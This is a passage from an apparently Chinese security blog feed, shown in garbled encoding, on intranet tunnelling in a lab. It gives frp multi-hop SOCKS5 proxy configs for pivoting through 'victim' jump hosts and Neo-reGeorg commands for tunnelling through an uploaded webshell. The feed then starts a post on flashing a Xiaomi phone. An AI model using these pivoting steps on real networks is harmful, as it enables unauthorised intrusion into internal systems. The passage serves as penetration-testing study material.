æœ€å¤§è¿æ¥æ•°</span><br><span class="line">protocol = tcp</span><br><span class="line">health_check_type = tcp</span><br><span class="line">health_check_interval_s = 100</span><br><span class="line">[test]# ä»£ç†åç§°ï¼Œå¯è‡ªè¡Œä¿®æ”¹</span><br><span class="line">remote_port = 40000# ä»£ç†çš„ç«¯å£ï¼Œè¿æ¥ proxifier æ—¶éœ€è¦ç”¨</span><br><span class="line">plugin = socks5# ä½¿ç”¨çš„åè®®</span><br><span class="line">use_encryption = true# æ˜¯å¦åŠ å¯†</span><br><span class="line">use_compression = true</span><br></pre></td></tr></table></figure></div><p>3ã€ä½¿ç”¨æ–¹æ³•</p><p>é…ç½®å®ŒæœåŠ¡ç«¯ä¸å®¢æˆ·ç«¯çš„é…ç½®æ–‡ä»¶åï¼ŒæœåŠ¡ç«¯å¯åŠ¨æœåŠ¡</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">./frps -c frps.ini </span><br><span class="line"></span><br><span class="line"># æŒ‚åœ¨åå°è¿è¡Œå‘½ä»¤</span><br><span class="line">nohup ./frps -c frps.ini &gt;/dev/null 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230425123300299.png" data-caption="image-20230425123300299"><img src="/../images/tunnel/image-20230425123300299.png" alt="image-20230425123300299"></a></p><p>å®¢æˆ·ç«¯å¯åŠ¨æœåŠ¡ï¼Œè¿›è¡Œè¿æ¥</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">frpc.exe -c frpc.ini</span><br><span class="line"></span><br><span class="line"># åå°è¿è¡Œå‘½ä»¤</span><br><span class="line">nohup ./frpc -c frpc.ini &gt;/dev/null 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230425123538555.png" data-caption="image-20230425123538555"><img src="/../images/tunnel/image-20230425123538555.png" alt="image-20230425123538555"></a></p><p>åˆ©ç”¨ proxifier è¿›è¡Œè¿æ¥</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430191349822.png" data-caption="image-20230430191349822"><img src="/../images/tunnel/image-20230430191349822.png" alt="image-20230430191349822"></a></p><p>è®¿é—®å†…ç½‘èµ„æºï¼Œå®ç°çªç ´ç½‘ç»œè¾¹ç•Œ</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230425124058682.png" data-caption="image-20230425124058682"><img src="/../images/tunnel/image-20230425124058682.png" alt="image-20230425124058682"></a></p><p>éš§é“æµé‡å¦‚ä¸‹</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430191552717.png" data-caption="image-20230430191552717"><img src="/../images/tunnel/image-20230430191552717.png" alt="image-20230430191552717"></a></p><h4 id="åˆ©ç”¨æ–¹å¼-2"><a href="#åˆ©ç”¨æ–¹å¼-2" class="headerlink" title="åˆ©ç”¨æ–¹å¼"></a>åˆ©ç”¨æ–¹å¼</h4><h5 id="frp-å¤šçº§ä»£ç†"><a href="#frp-å¤šçº§ä»£ç†" class="headerlink" title="frp å¤šçº§ä»£ç†"></a>frp å¤šçº§ä»£ç†</h5><p>é€šè¿‡è·³æ¿æœº-1 å°†æµé‡ä»£ç†åˆ°æœåŠ¡å™¨ï¼ˆvpsï¼‰ä¸Šæ­å»ºç¬¬ä¸€å±‚ frp ä»£ç†ï¼Œè·å– 192.168.20.200 ä¸»æœºã€‚ç„¶åé€šè¿‡ 192.168.20.200 æ­å»ºç¬¬äºŒå±‚ä»£ç†è®¿é—® 10.10.20.30 çš„ç½‘ç»œèµ„æºã€‚</p><p>è·³æ¿æœº-1</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230502145949254.png" data-caption="image-20230502145949254"><img src="/../images/tunnel/image-20230502145949254.png" alt="image-20230502145949254"></a></p><p>è·³æ¿æœº-2</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230502153345821.png" data-caption="image-20230502153345821"><img src="/../images/tunnel/image-20230502153345821.png" alt="image-20230502153345821"></a></p><p>éœ€è¦è®¿é—®çš„å¤šå±‚ç½‘ç»œå†…ç½‘ä¸»æœº</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230502153956115.png" data-caption="image-20230502153956115"><img src="/../images/tunnel/image-20230502153956115.png" alt="image-20230502153956115"></a></p><p>1ã€ç¬¬ä¸€å±‚ä»£ç†æ­å»º</p><p>æœåŠ¡ç«¯ï¼ˆvpsï¼‰frps.ini é…ç½®æ–‡ä»¶</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_addr = 0.0.0.0</span><br><span class="line">bind_port = 2222</span><br></pre></td></tr></table></figure></div><p>å®¢æˆ·ç«¯ï¼ˆå—å®³è€…ä¸»æœº 192.168.11.128ï¼‰frpc.ini é…ç½®æ–‡ä»¶</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = x.x.x.x</span><br><span class="line">server_port = 2222</span><br><span class="line"></span><br><span class="line">[http_proxy]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 192.168.20.100</span><br><span class="line">remote_port = 3333ã€‚</span><br><span class="line">local_port 3333</span><br><span class="line">plugin = socks5</span><br></pre></td></tr></table></figure></div><p>å¯åŠ¨æœåŠ¡ç«¯</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps -c frps.ini</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230502161505106.png" data-caption="image-20230502161505106"><img src="/../images/tunnel/image-20230502161505106.png" alt="image-20230502161505106"></a></p><p>å¯åŠ¨å®¢æˆ·ç«¯</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frpc -c frpc.ini</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230502161839332.png" data-caption="image-20230502161839332"><img src="/../images/tunnel/image-20230502161839332.png" alt="image-20230502161839332"></a></p><p>æœ¬æœº proxifier è¿æ¥ éš§é“</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230502164653706.png" data-caption="image-20230502164653706"><img src="/../images/tunnel/image-20230502164653706.png" alt="image-20230502164653706"></a></p><p>èƒ½è®¿é—®å—å®³ä¸»æœºçš„å¦ä¸€ç½‘å¡ 192.168.20.100 çš„å†…ç½‘èµ„æº</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230502165032679.png" data-caption="image-20230502165032679"><img src="/../images/tunnel/image-20230502165032679.png" alt="image-20230502165032679"></a></p><p>2ã€ç¬¬äºŒå±‚ç½‘ç»œæ­å»º</p><p>æ­å»ºç¬¬äºŒå±‚ç½‘ç»œæ—¶ï¼Œè·³æ¿æœº-1æ—¢æ˜¯ frp çš„æœåŠ¡ç«¯ï¼Œä¹Ÿæ˜¯å®¢æˆ·ç«¯ï¼ŒæŒ‡å‘çš„ IP ä¸ä¸€æ ·ï¼Œå…·ä½“è¯·è§‚å¯Ÿé…ç½®æ–‡ä»¶å·®å¼‚</p><p>192.168.11.128 ä¸Šå¯åŠ¨ frps  é…ç½®æ–‡ä»¶å¦‚ä¸‹ï¼ˆæ³¨æ„ï¼Œæ­¤å‰çš„ frpc æœåŠ¡ä¸è¦å…³é—­ï¼‰</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_addr = 192.168.20.100</span><br><span class="line">bind_port = 2222</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230502175550215.png" data-caption="image-20230502175550215"><img src="/../images/tunnel/image-20230502175550215.png" alt="image-20230502175550215"></a></p><p>å› ä¸ºè¿™é‡Œæ˜¯å‡è®¾å·²ç»è·å–äº†è·³æ¿æœº-2ï¼Œ192.168.20.200 çš„ä¸»æœºæƒé™ï¼Œè¿™é‡Œå¯åŠ¨ frpc ï¼Œé…ç½®æ–‡ä»¶å¦‚ä¸‹</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 192.168.20.100</span><br><span class="line">server_port = 2222</span><br><span class="line"></span><br><span class="line">[web]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 192.168.20.200</span><br><span class="line">local_port = 3333</span><br><span class="line">remote_port = 3333</span><br><span class="line">plugin = socks5</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230502175531322.png" data-caption="image-20230502175531322"><img src="/../images/tunnel/image-20230502175531322.png" alt="image-20230502175531322"></a></p><p>3ã€å½“ frp å…¨éƒ¨æœåŠ¡éƒ½å¼€å¯åï¼Œé€šè¿‡ proxifier è®¾ç½®ä»£ç†é“¾ï¼Œç„¶åå°±å¯ä»¥åœ¨æœ¬æœºä¸Šè®¿é—®ç¬¬äºŒå±‚å†…ç½‘èµ„æºäº†ï¼Œ Proxifier è®¾ç½®è§£é‡Šä¸ºï¼Œæˆ‘ä»¬ç½‘ç»œé¦–å…ˆé€šè¿‡ç¬¬ä¸€å±‚ VPS çš„ä»£ç†ç½‘ç»œï¼Œç„¶åé€šè¿‡è®¾ç½® 192.168.20.100 çš„ä»£ç†è¿›å…¥ç¬¬äºŒå±‚ç½‘ç»œï¼Œä»è€Œå®ç°å¤šçº§ä»£ç†ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230502181506434.png" data-caption="image-20230502181506434"><img src="/../images/tunnel/image-20230502181506434.png" alt="image-20230502181506434"></a></p><p>è®¾ç½®ä»£ç†é“¾åï¼Œå¯åœ¨æœ¬æœºè®¿é—®ç¬¬äºŒå±‚çš„å†…ç½‘èµ„æºï¼ˆä¸‹å›¾ä¸º10.10.20.30 ä¸‹ web æœåŠ¡å›¾ç‰‡ï¼Œå‡è£… weblogicï¼‰</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230502180938037.png" data-caption="image-20230502180938037"><img src="/../images/tunnel/image-20230502180938037.png" alt="image-20230502180938037"></a></p><blockquote><p>æ³¨æ„ï¼Œfrp é…ç½®æ–‡ä»¶çš„ç«¯å£ï¼Œéœ€è¦é˜²ç«å¢™å¼€æ”¾æ‰èƒ½æ­å»ºæˆåŠŸï¼Œå…·ä½“ç«¯å£ï¼Œæ ¹æ®å®é™…æƒ…å†µè®¾ç½®ã€‚</p></blockquote><h2 id="å…­ã€HTTP-éš§é“"><a href="#å…­ã€HTTP-éš§é“" class="headerlink" title="å…­ã€HTTP éš§é“"></a>å…­ã€HTTP éš§é“</h2><p>HTTP éš§é“æ˜¯ä¸€ç§ä½¿ç”¨ HTTP åè®®è¿›è¡Œæ•°æ®ä¼ è¾“çš„æŠ€æœ¯ï¼Œå®ƒå¯ä»¥å°†å†…ç½‘ä¸­çš„æœåŠ¡æ˜ å°„åˆ°å…¬ç½‘åœ°å€ä¸Šï¼Œå®ç°å†…ç½‘ç©¿é€çš„åŠŸèƒ½ã€‚</p><h3 id="éš§é“æ­å»º-4"><a href="#éš§é“æ­å»º-4" class="headerlink" title="éš§é“æ­å»º"></a>éš§é“æ­å»º</h3><p>HTTP éš§é“æ­å»ºä½¿ç”¨Neo-reGeorgï¼Œé¡¹ç›®åœ°å€  <a href="https://github.com/L-codes/Neo-reGeorg">https://github.com/L-codes/Neo-reGeorg</a></p><p>æ”»å‡»æœºï¼Œä¸å¯é€šå†…ç½‘</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430222233947.png" data-caption="image-20230430222233947"><img src="/../images/tunnel/image-20230430222233947.png" alt="image-20230430222233947"></a></p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230501121018884.png" data-caption="image-20230501121018884"><img src="/../images/tunnel/image-20230501121018884.png" alt="image-20230501121018884"></a></p><p>å—å®³è€…ï¼ˆåŒç½‘å¡ï¼‰ï¼Œæ¨¡æ‹Ÿ WEB æœåŠ¡å™¨</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430200246139.png" data-caption="image-20230430200246139"><img src="/../images/tunnel/image-20230430200246139.png" alt="image-20230430200246139"></a></p><p>1ã€åœ¨æ”»å‡»æœºä¸Šä½¿ç”¨ Python ç”Ÿæˆ tunnel.(aspx|ashx|jsp|jspx|php)  è„šæœ¬ï¼Œè®¾ç½®å¯†ç å¹¶ä¸Šä¼ åˆ° WEB æœåŠ¡å™¨</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 neoreg.py generate -k password</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430222855435.png" data-caption="image-20230430222855435"><img src="/../images/tunnel/image-20230430222855435.png" alt="image-20230430222855435"></a></p><p>2ã€åœ¨è·å– webshell çš„æƒ…å†µä¸‹ï¼Œæ ¹æ®ç½‘ç«™è¯­è¨€ç±»å‹ä¸Šä¼ ç›¸åº”çš„è„šæœ¬å€¼ web æœåŠ¡å™¨ä¸­</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430201343337.png" data-caption="image-20230430201343337"><img src="/../images/tunnel/image-20230430201343337.png" alt="image-20230430201343337"></a></p><p>3ã€è¿æ¥éš§é“</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 neoreg.py -k password -u http://192.168.11.133:8003/tunnel.php -p 2333</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430223344270.png" data-caption="image-20230430223344270"><img src="/../images/tunnel/image-20230430223344270.png" alt="image-20230430223344270"></a></p><p>4ã€åˆ©ç”¨ proxifier è¿æ¥ socksï¼Œè®¿é—®å†…ç½‘èµ„æº</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430230435504.png" data-caption="image-20230430230435504"><img src="/../images/tunnel/image-20230430230435504.png" alt="image-20230430230435504"></a></p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430230447663.png" data-caption="image-20230430230447663"><img src="/../images/tunnel/image-20230430230447663.png" alt="image-20230430230447663"></a></p><p>éš§é“æµé‡å¦‚ä¸‹</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430231412509.png" data-caption="image-20230430231412509"><img src="/../images/tunnel/image-20230430231412509.png" alt="image-20230430231412509"></a></p><h2 id="ä¸ƒã€æ‰©å±•"><a href="#ä¸ƒã€æ‰©å±•" class="headerlink" title="ä¸ƒã€æ‰©å±•"></a>ä¸ƒã€æ‰©å±•</h2><h3 id="å‡ºç½‘ç±»å‹"><a href="#å‡ºç½‘ç±»å‹" class="headerlink" title="å‡ºç½‘ç±»å‹"></a>å‡ºç½‘ç±»å‹</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">| åè®®    | å‘½ä»¤                    |</span><br><span class="line">| ------- | ----------------------- |</span><br><span class="line">| ICMP    | ping ip/domain          |</span><br><span class="line">| HTTP    | curl ip or domain       |</span><br><span class="line">| DNS     | nslookup domain 8.8.8.8 |</span><br><span class="line">| TCP/UDP | telnet ip port          |</span><br></pre></td></tr></table></figure></div><h3 id="ä»£ç†ç±»å‹"><a href="#ä»£ç†ç±»å‹" class="headerlink" title="ä»£ç†ç±»å‹"></a>ä»£ç†ç±»å‹</h3><p>æ­£å‘ä»£ç†ï¼ˆForward Proxyï¼‰ï¼šä»£ç†æœåŠ¡å™¨å‘å¤–éƒ¨ç½‘ç»œå‘é€è¯·æ±‚ï¼Œé€šå¸¸è¢«ç”¨äºå†…éƒ¨ç½‘ç»œæ— æ³•ç›´æ¥è®¿é—®å¤–éƒ¨ç½‘ç»œçš„æƒ…å†µã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå®¢æˆ·ç«¯å‘ä»£ç†æœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œå¹¶åœ¨ä»£ç†æœåŠ¡å™¨ä¸Šå¤„ç†å¹¶è½¬å‘è¯·æ±‚ï¼Œä½œä¸ºå®¢æˆ·ç«¯çš„ä»£ç†ï¼Œä»£ç†æœåŠ¡å™¨ä¼šå°†è¯·æ±‚å‘é€åˆ°ç›®æ ‡æœåŠ¡å™¨ï¼Œæ¥æ”¶å“åº”ï¼Œç„¶åè½¬å‘ç»™å®¢æˆ·ç«¯ã€‚ï¼ˆä¾‹å­ï¼šå…¬ç½‘ frp ä½œä¸ºå®¢æˆ·ç«¯ï¼Œå†…ç½‘ä¸»æœºä½œä¸ºæœåŠ¡ç«¯ï¼‰</p><p>åå‘ä»£ç†ï¼ˆReverse Proxyï¼‰ï¼šä»£ç†æœåŠ¡å™¨å‘å†…éƒ¨ç½‘ç»œå‘é€è¯·æ±‚ï¼Œé€šå¸¸è¢«ç”¨äºå¤–éƒ¨ç½‘ç»œæ— æ³•ç›´æ¥è®¿é—®å†…éƒ¨ç½‘ç»œçš„æƒ…å†µã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä»£ç†æœåŠ¡å™¨æ¥æ”¶å¤–éƒ¨ç½‘ç»œçš„è¯·æ±‚å¹¶åœ¨ä»£ç†æœåŠ¡å™¨ä¸Šè¿›è¡Œå¤„ç†ï¼Œå¹¶å°†è¯·æ±‚è½¬å‘åˆ°å†…éƒ¨æœåŠ¡å™¨ã€‚å½“å†…éƒ¨æœåŠ¡å™¨å‘é€å“åº”æ—¶ï¼Œä»£ç†æœåŠ¡å™¨å°†å“åº”è¿”å›ç»™å¤–éƒ¨å®¢æˆ·ç«¯ï¼Œä»è€Œéšè—äº†å†…éƒ¨æœåŠ¡å™¨çš„çœŸå® IP åœ°å€å’Œå…¶ä»–ä¿¡æ¯ã€‚ï¼ˆä¾‹å­ï¼šå…¬ç½‘ frp ä½œä¸ºæœåŠ¡ç«¯ï¼Œå†…ç½‘ä¸»æœºä½œä¸ºå®¢æˆ·ç«¯ï¼‰</p><h3 id="è¿æ¥ç±»å‹"><a href="#è¿æ¥ç±»å‹" class="headerlink" title="è¿æ¥ç±»å‹"></a>è¿æ¥ç±»å‹</h3><p>æ­£å‘è¿æ¥ï¼šå®¢æˆ·ç«¯å‘æœåŠ¡å™¨å‘èµ·è¿æ¥è¯·æ±‚ï¼ŒæœåŠ¡å™¨æ¥å—è¯·æ±‚å¹¶å»ºç«‹è¿æ¥ï¼ˆä¾‹å­ï¼šå—å®³è€…ä¸»æœºå…·å¤‡å…¬ç½‘IPå¯å‡ºç½‘ï¼Œæ­¤æ—¶å—å®³è€…ä¸»æœºç›‘å¬ä¸€ä¸ªç«¯å£ï¼Œæ”»å‡»è€…ä¸»åŠ¨è¿æ¥ï¼‰</p><p>åå‘è¿æ¥ï¼šæœåŠ¡å™¨ä¸»åŠ¨å‘å®¢æˆ·ç«¯å‘èµ·è¿æ¥è¯·æ±‚ï¼Œå®¢æˆ·ç«¯æ¥å—è¯·æ±‚å¹¶å»ºç«‹è¿æ¥ï¼ˆä¾‹å­ï¼šå†…ç½‘ä¸»æœºèƒ½å‡ºç½‘ï¼Œä½†æ²¡æœ‰å…¬ç½‘IPï¼Œæ”»å‡»è€…æ— æ³•ç›´æ¥è¿æ¥ï¼Œæ­¤æ—¶æ”»å‡»è€…ç›‘å¬ä¸€ä¸ªç«¯å£ï¼Œå—å®³è€…ä¸»åŠ¨è¿æ¥æ”»å‡»è€…ç«¯å£ï¼‰</p><h2 id="å…«ã€æ€»ç»“"><a href="#å…«ã€æ€»ç»“" class="headerlink" title="å…«ã€æ€»ç»“"></a>å…«ã€æ€»ç»“</h2><p>é€šè¿‡å­¦ä¹ éš§é“ç›¸å…³çŸ¥è¯†ï¼Œé€‰å–äº†éƒ¨åˆ†å·¥å…·é‡æ–°ç†Ÿæ‚‰äº†å„ç§éš§é“çš„æ­å»ºï¼Œè™½ç„¶åè®®ä¸Šæœ‰äº›è®¸å·®å¼‚ï¼Œä½†å…¶é€»è¾‘ä¸Šå¤§å·®ä¸å·®ã€‚æ–‡ç« ä¸»è¦è¿˜æ˜¯å·¥å…·ä¸Šçš„ä½¿ç”¨ä»¥åŠåè®®ä¸Šçš„ç†è§£ã€‚</p><h2 id="ä¹ã€å‚è€ƒ"><a href="#ä¹ã€å‚è€ƒ" class="headerlink" title="ä¹ã€å‚è€ƒ"></a>ä¹ã€å‚è€ƒ</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">https://mp.weixin.qq.com/s/DlhqE6Yxo9IEXBKRl5epIA</span><br><span class="line">https://github.com/esrrhs/pingtunnel</span><br><span class="line">https://forum.butian.net/share/400</span><br><span class="line">https://github.com/iagox86/dnscat2</span><br><span class="line">https://cloud.tencent.com/developer/article/2130053</span><br><span class="line">https://xz.aliyun.com/t/2214</span><br><span class="line">https://blog.csdn.net/qq_44159028/article/details/120748587</span><br><span class="line">https://mp.weixin.qq.com/s/RiFrP2IurA3Z5JcmWE0Vfg</span><br><span class="line">https://mp.weixin.qq.com/s/_g3rXXyq7HxMM1FVhs2Y1g</span><br><span class="line">https://github.com/fatedier/frp</span><br><span class="line">https://github.com/L-codes/Neo-reGeorg</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> å†…ç½‘å®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DNS </tag>
            
            <tag> éš§é“æ­å»º </tag>
            
            <tag> HTTP </tag>
            
            <tag> SOCKS </tag>
            
            <tag> ICMP </tag>
            
            <tag> SSH </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>APPæµ‹è¯•ç³»åˆ—-å°ç±³8 çº¿åˆ· Pixel Experience</title>
      <link href="/2023/04/04/APP%E6%B5%8B%E8%AF%95%E7%B3%BB%E5%88%97-%E5%B0%8F%E7%B1%B38%20%E7%BA%BF%E5%88%B7%20Pixel%20Experience/"/>
      <url>/2023/04/04/APP%E6%B5%8B%E8%AF%95%E7%B3%BB%E5%88%97-%E5%B0%8F%E7%B1%B38%20%E7%BA%BF%E5%88%B7%20Pixel%20Experience/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p><a data-fancybox="gallery" data-src="/../images/Pixel/title.png" data-caption="Hello Android"><img src="/../images/Pixel/title.png" alt="Hello Android"></a></p><h2 id="ä¸€ã€å‰è¨€"><a href="#ä¸€ã€å‰è¨€" class="headerlink" title="ä¸€ã€å‰è¨€"></a>ä¸€ã€å‰è¨€</h2><p>å‰æ®µæ—¶é—´æœ‰ä¸ªéœ€æ±‚è¦æµ‹è¯•ä¸ªAndroid APPï¼Œç”±äº APP æƒé™é—®é¢˜ï¼Œè‡ªç”¨æ‰‹æœºæ— æ³•è¿›è¡Œæ­£å¸¸æ‰“å¼€ï¼Œå½“æ—¶æ—è¾¹æœ‰ä½åŒäº‹åˆšå¥½æœ‰å° Pixel ï¼Œç©äº†ä¸€ä¸‹ä½“éªŒè¿˜ä¸é”™ï¼Œæµ‹è¯•ä¹Ÿèƒ½é¡ºåˆ©çš„è¿›è¡Œï¼Œå½“å®Œæˆæµ‹è¯•å·²ç»å‘¨äº”äº†ï¼Œåˆšå¥½æ‰‹å¤´ä¸Šæœ‰å°é—²ç½®çš„æ‰‹æœºï¼Œäºæ˜¯ä¹åˆ©ç”¨å‘¨æœ«æ—¶é—´ä» 0 åˆ° 1 äº†è§£äº†ä¸€ä¸‹åˆ·æœºçŸ¥è¯†ï¼Œåˆ·å…¥äº†Pixel Experienceï¼Œè®°å½•ä¸€ä¸‹è¿‡ç¨‹ã€‚</p><h2 id="äºŒã€åˆ·æœºçŸ¥è¯†"><a href="#äºŒã€åˆ·æœºçŸ¥è¯†" class="headerlink" title="äºŒã€åˆ·æœºçŸ¥è¯†"></a>äºŒã€åˆ·æœºçŸ¥è¯†</h2><h3 id="çº¿åˆ·ä¸å¡åˆ·"><a href="#çº¿åˆ·ä¸å¡åˆ·" class="headerlink" title="çº¿åˆ·ä¸å¡åˆ·"></a>çº¿åˆ·ä¸å¡åˆ·</h3><p><strong>çº¿åˆ·ï¼š</strong>åˆ·äº†å®˜æ–¹ ROM çš„ recovery.img åˆ·æœºæ–¹å¼å°±æ˜¯çº¿åˆ·,æŒ‡ä½¿ç”¨USBçº¿è¿æ¥ä¸ªäººè®¡ç®—æœºï¼Œå¹¶åœ¨ä¸ªäººè®¡ç®—æœºä¸Šä½¿ç”¨åˆ·æœºè½¯ä»¶è¿›è¡Œåˆ·æœºã€‚</p><p><strong>å¡åˆ·ï¼š</strong>åˆ·äº†ç¬¬ä¸‰æ–¹ä¸­æ–‡ recovery.img åˆ·æœºæ–¹å¼å°±æ˜¯å¡åˆ·ï¼Œå¡åˆ·åˆ™æ˜¯æŠŠå›ºä»¶æˆ–è€…å‡çº§åŒ…æ‹·è´åˆ°æ‰‹æœºSDå¡ä¸­è¿›è¡Œåˆ·æœºå‡çº§æ“ä½œã€‚</p><h3 id="åº•åŒ…"><a href="#åº•åŒ…" class="headerlink" title="åº•åŒ…"></a>åº•åŒ…</h3><p>æŒ‡çš„æ˜¯å®˜æ–¹çš„çº¿åˆ·åŒ…ï¼Œä¹Ÿå°±æ˜¯å®˜æ–¹çš„ROMï¼Œåœ¨åˆ·å…¥ç¬¬ä¸‰æ–¹åŸç”Ÿç³»ç»Ÿçš„æ—¶å€™éœ€è¦å…ˆåˆ·å…¥å®˜æ–¹åº•åŒ…ï¼Œå› ä¸ºè¿™äº›åŸç”Ÿç³»ç»Ÿä¸­ä¸å¸¦å®˜æ–¹åº•å±‚åˆ†åŒºæ–‡ä»¶ï¼Œéœ€è¦åº•åŒ…ä½œä¸ºä¸€ä¸ªè¡”æ¥çš„ä½œç”¨ã€‚</p><h3 id="Recovery"><a href="#Recovery" class="headerlink" title="Recovery"></a>Recovery</h3><p>Recovery ä¸º Android æ‰‹æœºå¤‡ä»½åŠŸèƒ½ï¼Œå¯ä»¥å¯¹å®‰å“æ‰‹æœºå†…éƒ¨çš„æ•°æ®æˆ–ç³»ç»Ÿè¿›è¡Œä¿®æ”¹çš„æ¨¡å¼ï¼Œç±»ä¼¼äº Windows çš„ PE ï¼Œæ¯ä¸ªæ‰‹æœºéƒ½è‡ªå¸¦ Recovery ï¼Œå…³æœºçŠ¶æ€ä¸‹ï¼ŒæŒ‰ä½æ‰‹æœºç”µæºé”®å’ŒéŸ³é‡+é”®ï¼Œç›´åˆ°äº®å±ï¼Œæ¾å¼€å°±å¯ä»¥è¿›å…¥æœ¬æœº Recoveryï¼Œæ¯ä¸ªå‚å•†çš„ Recovery ç•Œé¢æˆ–ä¼šä¸åŒï¼ŒåŠŸèƒ½åŠŸèƒ½ä¸Šä¹Ÿä¼šæœ‰æ‰€åŒºåˆ«ï¼Œä¸€èˆ¬æ‰€ä»¥ä¸€èˆ¬åˆ·æœºä¼šé€‰æ‹©è¾“å…¥ç¬¬ä¸‰æ–¹çš„ Recovery ï¼ŒåŠŸèƒ½ä¸Šä¼šå¤šä¸€ç‚¹ï¼Œè¿™å°±æ˜¯é€šå¸¸åˆ·æœºæ–‡ç« ä¸Šå‡ºç°åˆ·å…¥ Recoveryã€‚</p><h2 id="ä¸‰ã€åˆ·æœºè¿‡ç¨‹"><a href="#ä¸‰ã€åˆ·æœºè¿‡ç¨‹" class="headerlink" title="ä¸‰ã€åˆ·æœºè¿‡ç¨‹"></a>ä¸‰ã€åˆ·æœºè¿‡ç¨‹</h2><h3 